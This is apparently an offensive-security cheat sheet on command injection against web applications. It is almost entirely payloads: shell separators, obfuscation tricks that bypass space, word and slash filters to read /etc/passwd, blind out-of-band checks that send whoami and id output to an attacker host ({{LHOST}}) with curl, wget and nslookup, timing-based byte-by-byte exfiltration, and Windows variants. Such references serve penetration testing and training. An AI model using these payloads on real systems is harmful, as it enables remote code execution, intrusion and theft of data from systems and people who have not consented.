---
title: Command Injection
category: web
description: Break out of shell strings and exfil results.
tags: [rce, injection, web]
os: [any]
order: 60
---

## Separators to try

```text
; id
| id
& id
&& id
|| id
`id`
$(id)
%0a id        (newline)
%0d id        (CR)
```

## Bypassing filters

```bash
# Spaces filtered
{cat,/etc/passwd}
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
X=$'cat\x20/etc/passwd';$X

# Words filtered
c'a't /etc/passwd
ca''t /etc/passwd
ca\t /etc/passwd
/???/c?t /???/p?sswd

# Slash filtered
${PATH:0:1}etc${PATH:0:1}passwd
$(printf '\57etc\57passwd')
```

## Blind — confirm with OOB

```bash
ping -c 1 {{LHOST}}
curl http://{{LHOST}}/$(whoami)
nslookup `whoami`.{{LHOST}}
wget --post-data="$(id)" http://{{LHOST}}/
```

## Time-based confirm

```bash
sleep 5
ping -c 5 127.0.0.1
```

## Exfil one byte at a time

```bash
[ "$(id -u)" = "0" ] && sleep 5
[ "$(whoami | cut -c1)" = "a" ] && sleep 5
```

## Windows equivalents

```text
& whoami
&& whoami
| whoami
%0a whoami
^&^ whoami         (caret escapes in cmd)
"powershell -nop -c whoami"
```
